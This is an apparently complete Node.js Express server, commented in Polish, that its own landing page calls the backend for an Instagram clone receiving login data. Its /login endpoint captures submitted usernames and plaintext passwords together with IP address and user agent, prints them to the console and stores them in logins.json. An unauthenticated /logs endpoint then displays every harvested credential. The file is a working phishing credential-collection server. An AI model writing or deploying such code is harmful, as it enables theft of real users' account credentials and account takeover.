const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// DODANE: Logowanie każdego żądania dla diagnostyki
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Zapisywanie danych logowania
app.post('/login', (req, res) => {
    console.log('=== OTRZYMANO ŻĄDANIE POST /login ===');
    console.log('Body:', JSON.stringify(req.body, null, 2));
    console.log('IP:', req.ip);
    console.log('Headers:', req.headers);
    
    const { username, password, timestamp, userAgent } = req.body;
    
    // Sprawdź czy dane dotarły
    if (!username || !password) {
        console.log('❌ Błąd: Brak nazwy użytkownika lub hasła!');
        return res.status(400).json({ 
            status: 'error', 
            message: 'Brak wymaganych danych' 
        });
    }
    
    const logEntry = {
        id: Date.now(),
        username: username,
        password: password,
        timestamp: timestamp || new Date().toISOString(),
        userAgent: userAgent || req.get('User-Agent'),
        ip: req.ip,
        date: new Date().toISOString()
    };
    
    // Zapis do pliku
    const logFile = path.join(__dirname, 'logins.json');
    let logs = [];
    
    if (fs.existsSync(logFile)) {
        try {
            const data = fs.readFileSync(logFile, 'utf8');
            logs = JSON.parse(data);
            console.log(`Odczytano ${logs.length} istniejących wpisów`);
        } catch(e) {
            console.log('Błąd odczytu pliku:', e.message);
        }
    }
    
    logs.push(logEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    
    console.log(`✅ Zapisano logowanie: ${username} (${password})`);
    console.log(`📁 Plik zapisany w: ${logFile}`);
    console.log(`📊 Łączna liczba wpisów: ${logs.length}`);
    
    res.json({ status: 'ok', message: 'Dane zapisane' });
});

// Endpoint do podglądu zapisanych danych
app.get('/logs', (req, res) => {
    console.log('=== OTRZYMANO ŻĄDANIE GET /logs ===');
    const logFile = path.join(__dirname, 'logins.json');
    
    if (fs.existsSync(logFile)) {
        try {
            const logs = fs.readFileSync(logFile, 'utf8');
            const data = JSON.parse(logs);
            console.log(`Odczytano ${data.length} wpisów`);
            
            res.json({
                total: data.length,
                all: data
            });
        } catch(e) {
            console.log('Błąd:', e.message);
            res.status(500).json({ error: 'Błąd odczytu danych', details: e.message });
        }
    } else {
        console.log('❌ Plik logins.json nie istnieje!');
        res.json({ 
            total: 0, 
            message: 'Brak zapisanych danych. Plik jeszcze nie został utworzony.' 
        });
    }
});

// Prosty endpoint testowy
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>Backend Instagram Clone</title></head>
            <body style="font-family: Arial; padding: 20px;">
                <h1>Backend działa! ✅</h1>
                <p>Serwer przyjmuje dane logowania z klonu Instagrama.</p>
                <h2>Endpointy:</h2>
                <ul>
                    <li><a href="/logs">/logs</a> - Podgląd zapisanych danych</li>
                    <li><code>POST /login</code> - Zapisywanie danych logowania</li>
                </ul>
                <hr>
                <h3>Stan serwera:</h3>
                <p><strong>Metoda zapisu:</strong> Plik logins.json</p>
                <p><strong>Ścieżka:</strong> ${__dirname}</p>
            </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Serwer działa na porcie ${PORT}`);
    console.log(`📁 Katalog roboczy: ${__dirname}`);
    console.log(`📝 Endpoint danych: http://localhost:${PORT}/logs`);
});
